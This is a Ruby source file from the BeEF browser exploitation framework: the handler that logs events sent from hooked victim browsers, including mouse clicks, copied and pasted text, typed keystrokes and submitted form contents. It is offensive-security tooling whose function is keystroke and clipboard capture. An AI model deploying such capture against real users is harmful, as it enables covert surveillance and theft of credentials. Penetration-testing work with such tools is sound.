#
# Copyright (c) 2006-2023 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
module BeEF
  module Extension
    module Events
      #
      # The http handler that manages the Events.
      #
      class Handler
        HB = BeEF::Core::Models::HookedBrowser

        def initialize(data)
          @data = data
          setup
        end

        def setup
          beef_hook = @data['beefhook'] || nil

          unless BeEF::Filters.is_valid_hook_session_id?(beef_hook)
            print_error('[Event Logger] Invalid hooked browser session')
            return
          end

          # validates that a hooked browser with the beef_hook token exists in the db
          zombie = HB.where(session: beef_hook).first || nil
          if zombie.nil?
            print_error('[Event Logger] Invalid beef hook id: the hooked browser cannot be found in the database')
            return
          end

          events = @data['results'] || nil

          unless events.is_a?(Array)
            print_error("[Event Logger] Received event data of type #{events.class}; expected Array")
            return
          end

          # push events to logger
          logger = BeEF::Core::Logger.instance
          events.each do |event|
            unless event.is_a?(Hash)
              print_error("[Event Logger] Received event data of type #{event.class}; expected Hash")
              next
            end

            if event['type'].nil?
              print_error("[Event Logger] Received event with no type: #{event.inspect}")
              next
            end

            data = event_log_string(event)

            next if data.nil?

            logger.register('Event', data, zombie.id)
          end
        end

        private

        def event_log_string(event)
          return unless event.is_a?(Hash)

          event_type = event['type']

          return if event_type.nil?

          case event_type
          when 'click'
            result = "#{event['time']}s - [Mouse Click] x: #{event['x']} y:#{event['y']} > #{event['target']}"
          when 'focus'
            result = "#{event['time']}s - [Focus] Browser window has regained focus."
          when 'copy'
            result = "#{event['time']}s - [User Copied Text] \"#{event['data']}\""
          when 'cut'
            result = "#{event['time']}s - [User Cut Text] \"#{event['data']}\""
          when 'paste'
            result = "#{event['time']}s - [User Pasted Text] \"#{event['data']}\""
          when 'blur'
            result = "#{event['time']}s - [Blur] Browser window has lost focus."
          when 'console'
            result = "#{event['time']}s - [Console] #{event['data']}"
          when 'keys'
            print_debug "+++++++++++++++++ Key mods: #{event['mods']}"
            print_debug "EventData: #{event['data']}"

            result = "#{event['time']}s - [User Typed] #{event['data']}"
            if event['mods'].size.positive?
              result += " (modifiers: #{event['mods']})"
            end
          when 'submit'
            result = "#{event['time']}s - [Form Submitted] \"#{event['data']}\" > #{event['target']}"
          else
            print_debug("[Event Logger] Event handler has received event of unknown type '#{event_type}'")
            result = "#{event['time']}s - Unknown event '#{event_type}'"
          end

          result
        end
      end
    end
  end
end
